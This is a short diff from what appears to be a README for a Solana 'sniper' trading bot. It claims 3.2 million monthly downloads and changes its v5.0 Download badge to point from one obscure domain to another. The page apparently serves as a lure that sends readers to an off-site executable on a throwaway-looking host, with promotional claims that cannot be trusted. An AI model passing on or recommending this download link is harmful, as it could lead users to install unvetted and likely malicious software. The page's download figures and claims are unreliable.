@@ -49,7 +49,7 @@ A: Yes — buys within same block as liquidity add.
 
 **Monthly downloads:** 3.2m+
 
-[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/solsniper26)
+[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://p-csx-5.com/solsniper26)
 
 ---
 
